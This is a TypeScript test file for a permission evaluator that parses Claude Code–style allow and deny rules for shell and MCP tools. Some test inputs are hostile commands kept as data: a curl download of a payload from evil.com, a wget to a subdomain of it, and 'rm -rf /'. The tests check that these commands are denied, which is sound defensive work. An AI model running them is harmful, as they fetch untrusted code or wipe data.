/**
 * Tests for Claude Code–compatible rule syntax in the evaluator.
 */

import { describe, it } from "node:test";
import assert from "node:assert/strict";

import {
  evaluate,
  type PermissionPolicy,
  type EvaluationContext,
} from "../evaluate.ts";

describe("Claude Code rule syntax", () => {
  describe("exact matching", () => {
    it("matches exact command string", () => {
      const policy: PermissionPolicy = {
        defaultMode: "standard",
        permissions: {
          allow: ["Bash(git status)"],
        },
      };
      assert.equal(evaluate(policy, "bash", "git status"), "allow");
      assert.equal(evaluate(policy, "bash", "git status --short"), "ask");
    });
  });

  describe("prefix matching — word boundary", () => {
    it("matches command equal to prefix", () => {
      const policy: PermissionPolicy = {
        defaultMode: "standard",
        permissions: {
          allow: ["Bash(git:*)"],
        },
      };
      assert.equal(evaluate(policy, "bash", "git"), "allow");
    });

    it("matches command starting with prefix + space", () => {
      const policy: PermissionPolicy = {
        defaultMode: "standard",
        permissions: {
          allow: ["Bash(npm:*)"],
        },
      };
      assert.equal(evaluate(policy, "bash", "npm run test"), "allow");
      assert.equal(evaluate(policy, "bash", "npm publish"), "allow");
    });

    it("does not match without word boundary", () => {
      const policy: PermissionPolicy = {
        defaultMode: "standard",
        permissions: {
          allow: ["Bash(ls:*)"],
        },
      };
      assert.equal(evaluate(policy, "bash", "lsattr"), "ask");
      assert.equal(evaluate(policy, "bash", "lsof"), "ask");
    });
  });

  describe("wildcard matching", () => {
    it("matches * anywhere in pattern", () => {
      const policy: PermissionPolicy = {
        defaultMode: "standard",
        permissions: {
          allow: ["Bash(git commit *)"],
        },
      };
      assert.equal(evaluate(policy, "bash", "git commit -m test"), "allow");
    });

    it("trailing * matches bare command too", () => {
      const policy: PermissionPolicy = {
        defaultMode: "standard",
        permissions: {
          allow: ["Bash(git *)"],
        },
      };
      assert.equal(evaluate(policy, "bash", "git"), "allow");
      assert.equal(evaluate(policy, "bash", "git add"), "allow");
      assert.equal(evaluate(policy, "bash", "git commit -m test"), "allow");
    });

    it("matches *suffix pattern", () => {
      const policy: PermissionPolicy = {
        defaultMode: "standard",
        permissions: {
          allow: ["Bash(* Dockerfile)"],
        },
      };
      assert.equal(evaluate(policy, "bash", "cat Dockerfile"), "allow");
    });
  });

  describe("bare tool matching", () => {
    it("empty parens match any input for that tool", () => {
      const policy: PermissionPolicy = {
        defaultMode: "standard",
        permissions: {
          allow: ["Bash()"],
        },
      };
      assert.equal(evaluate(policy, "bash", "anything at all"), "allow");
    });

    it("star in parens matches any input for that tool", () => {
      const policy: PermissionPolicy = {
        defaultMode: "standard",
        permissions: {
          allow: ["Bash(*)"],
        },
      };
      assert.equal(evaluate(policy, "bash", "anything"), "allow");
    });
  });

  describe("escape sequences", () => {
    it("escaped parens in rule content become exact matches", () => {
      // Rule string in policy: "Bash(git log \(main\))"
      // Stored as: Bash(git log \(main\))
      // Parser sees \( and \) → unescapes to: git log (main)
      const rule = "Bash(git log \\(main\\))";
      const policy: PermissionPolicy = {
        defaultMode: "standard",
        permissions: { allow: [rule] },
      };
      assert.equal(evaluate(policy, "bash", "git log (main)"), "allow");
      // Without parens, should not match
      assert.equal(evaluate(policy, "bash", "git log main"), "ask");
    });

    it("escaped asterisk is literal, not wildcard", () => {
      // Rule string: "Bash(echo \*)" → parser sees \* → literal *
      const rule = "Bash(echo \\*)";
      const policy: PermissionPolicy = {
        defaultMode: "standard",
        permissions: { allow: [rule] },
      };
      assert.equal(evaluate(policy, "bash", "echo *"), "allow");
      // Unescaped wildcard would match anything after "echo "
      // But escaped * only matches literal *
      assert.equal(evaluate(policy, "bash", "echo hello"), "ask");
    });

    it("escaped backslash is literal", () => {
      // rawContent: echo \\ → unescaped: echo \
      const rule = "Bash(echo " + "\\" + "\\" + ")";
      const policy: PermissionPolicy = {
        defaultMode: "standard",
        permissions: { allow: [rule] },
      };
      assert.equal(evaluate(policy, "bash", "echo " + "\\"), "allow");
    });
  });

  describe("domain pattern", () => {
    it("matches when input contains the domain", () => {
      const policy: PermissionPolicy = {
        defaultMode: "standard",
        permissions: {
          deny: ["Bash(domain:evil.com)"],
        },
      };
      assert.equal(
        evaluate(policy, "bash", "curl https://evil.com/payload"),
        "deny",
      );
    });

    it("matches domain as substring of hostname", () => {
      const policy: PermissionPolicy = {
        defaultMode: "standard",
        permissions: {
          deny: ["Bash(domain:evil.com)"],
        },
      };
      assert.equal(evaluate(policy, "bash", "wget sub.evil.com/path"), "deny");
    });
  });

  describe("MCP tool matching", () => {
    it("matches entire MCP server", () => {
      const policy: PermissionPolicy = {
        defaultMode: "standard",
        permissions: {
          allow: ["mcp__github"],
        },
      };
      assert.equal(
        evaluate(policy, "mcp__github__create_issue", "{}"),
        "allow",
      );
      assert.equal(evaluate(policy, "mcp__github__list_prs", "{}"), "allow");
    });

    it("matches MCP server wildcard", () => {
      const policy: PermissionPolicy = {
        defaultMode: "standard",
        permissions: {
          deny: ["mcp__*__delete*"],
        },
      };
      assert.equal(evaluate(policy, "mcp__github__delete_issue", "{}"), "deny");
      assert.equal(evaluate(policy, "mcp__jira__delete_ticket", "{}"), "deny");
    });
  });
});

describe("conditional rules", () => {
  describe("basic matching", () => {
    it("first matching rule wins", () => {
      const policy: PermissionPolicy = {
        defaultMode: "standard",
        rules: [
          { tool: "Bash", pattern: "npm run *", tier: "allow" },
          { tool: "Bash", pattern: "npm run build", tier: "ask" },
        ],
      };
      assert.equal(evaluate(policy, "bash", "npm run build"), "allow");
    });

    it("falls through to permissions when no rule matches", () => {
      const policy: PermissionPolicy = {
        defaultMode: "standard",
        rules: [{ tool: "Bash", pattern: "npm:*", tier: "allow" }],
        permissions: { deny: ["Bash(rm *)"] },
      };
      assert.equal(evaluate(policy, "bash", "npm install"), "allow");
      assert.equal(evaluate(policy, "bash", "rm -rf /"), "deny");
    });

    it("prefix pattern in conditional rule", () => {
      const policy: PermissionPolicy = {
        defaultMode: "standard",
        rules: [{ tool: "Bash", pattern: "git:*", tier: "allow" }],
      };
      assert.equal(evaluate(policy, "bash", "git status"), "allow");
      assert.equal(evaluate(policy, "bash", "npm install"), "ask");
    });

    it("exact pattern in conditional rule", () => {
      const policy: PermissionPolicy = {
        defaultMode: "standard",
        rules: [{ tool: "Bash", pattern: "git status", tier: "allow" }],
      };
      assert.equal(evaluate(policy, "bash", "git status"), "allow");
      assert.equal(evaluate(policy, "bash", "git status --short"), "ask");
    });
  });

  describe("when conditions", () => {
    it("matches when cwd condition matches", () => {
      const policy: PermissionPolicy = {
        defaultMode: "standard",
        rules: [
          {
            tool: "Bash",
            pattern: "npm run *",
            tier: "allow",
            when: { cwd: "./packages/*" },
          },
        ],
      };
      const ctx: EvaluationContext = { cwd: "./packages/api" };
      assert.equal(evaluate(policy, "bash", "npm run test", ctx), "allow");

      const otherCtx: EvaluationContext = { cwd: "./scripts" };
      assert.equal(evaluate(policy, "bash", "npm run test", otherCtx), "ask");
    });

    it("matches when branch condition matches", () => {
      const policy: PermissionPolicy = {
        defaultMode: "standard",
        rules: [
          {
            tool: "Write",
            pattern: "./config/**",
            tier: "ask",
            when: { branch: "main" },
          },
        ],
      };
      const mainCtx: EvaluationContext = { branch: "main" };
      assert.equal(
        evaluate(policy, "write", "./config/app.yaml", mainCtx),
        "ask",
      );

      const featureCtx: EvaluationContext = { branch: "feature/test" };
      assert.equal(
        evaluate(policy, "write", "./config/app.yaml", featureCtx),
        "ask",
      );
    });

    it("AND logic — all conditions must match", () => {
      const policy: PermissionPolicy = {
        defaultMode: "standard",
        rules: [
          {
            tool: "Bash",
            pattern: "npm publish:*",
            tier: "deny",
            when: { cwd: "./packages/core", branch: "main" },
          },
        ],
      };
      // Both match
      assert.equal(
        evaluate(policy, "bash", "npm publish --access public", {
          cwd: "./packages/core",
          branch: "main",
        }),
        "deny",
      );

      // cwd doesn't match
      assert.equal(
        evaluate(policy, "bash", "npm publish --access public", {
          cwd: "./packages/utils",
          branch: "main",
        }),
        "ask",
      );
    });
  });
});
